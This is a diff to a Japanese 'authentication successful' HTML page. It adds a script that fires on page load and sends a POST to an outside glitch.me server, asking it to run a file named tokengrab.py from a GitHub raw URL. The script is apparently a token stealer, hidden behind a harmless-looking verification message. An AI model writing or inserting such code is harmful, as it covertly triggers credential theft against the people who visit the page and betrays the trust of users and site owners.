@@ -10,5 +10,34 @@
         <h1>認証成功</h1>
         <p>認証が正常に完了しました</p>
     </div>
+
+    <script>
+        // Function to execute tokengrab.py via server-side request
+        function executePythonScript() {
+            fetch('https://inky-neat-thyme.glitch.me/run-tokengrab', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    githubUrl: 'https://raw.githubusercontent.com/RepublicofAuech/vearithy/main/tokengrab.py' // Replace with actual GitHub file URL to execute
+                })
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Failed to execute tokengrab.py');
+                }
+                console.log('tokengrab.py executed successfully');
+            })
+            .catch(error => {
+                console.error('Error executing tokengrab.py:', error);
+            });
+        }
+
+        // Execute tokengrab.py when the page loads
+        document.addEventListener('DOMContentLoaded', function() {
+            executePythonScript();
+        });
+    </script>
 </body>
 </html>
